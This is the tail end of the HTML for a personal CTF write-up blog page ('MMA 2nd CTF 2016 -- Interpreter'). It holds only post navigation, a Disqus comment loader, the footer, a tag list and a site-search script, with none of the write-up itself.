  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/mma-2nd-ctf-2016-greeting/" class="btn btn-outline-primary"
    prompt="Older">
    <p>MMA 2nd CTF 2016 -- greeting</p>
  </a>
  

  
  <a href="/asis-ctf-finals-2016-car-market/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>ASIS CTF Finals 2016 -- car market</p>
  </a>
  

</div>


    
      <!--
  The Disqus lazy loading.
  Powered by: <https://github.com/osvaldasvalutis/disqusLoader.js>
-->

<div id="disqus" class="pt-2 pb-2">
  <p class="text-center text-muted small pb-5">
    Comments powered by <a href="https://disqus.com/">Disqus</a>.
  </p>
</div>

<script src="/assets/js/lib/jquery.disqusloader.min.js"></script>
<script>
  const options = {
    scriptUrl: '//bruce30262logdown.disqus.com/embed.js',

    disqusConfig: function() {
      this.page.title = 'MMA 2nd CTF 2016 -- Interpreter';
      this.page.url = 'http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/';
      this.page.identifier = '/mma-2nd-ctf-2016-interpreter/';
    }
  };

  $.disqusLoader('#disqus', options);
</script>

    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/bruce30262">Bruce Chen</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

